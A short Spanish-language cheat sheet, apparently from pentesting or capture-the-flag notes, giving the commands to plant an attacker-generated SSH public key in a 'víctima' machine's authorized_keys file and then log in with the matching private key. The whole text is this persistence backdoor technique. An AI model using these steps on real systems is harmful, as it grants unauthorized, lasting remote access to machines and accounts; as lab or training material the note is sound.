1. En la máquina víctima
```zsh
cd /home/user
mkdir -p .ssh
chmod 700 .ssh
```
2. En la máquina atacante
```zsh
ssh-keygen -t rsa -f user_key
cat user_key.pub ## Para copiar el contenido
```
3. De nuevo en la víctima
```
echo "CONTENIDO DE user_key.pub" > /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
```
4. Para conectar
```
ssh -i user_key user@<IP>
```
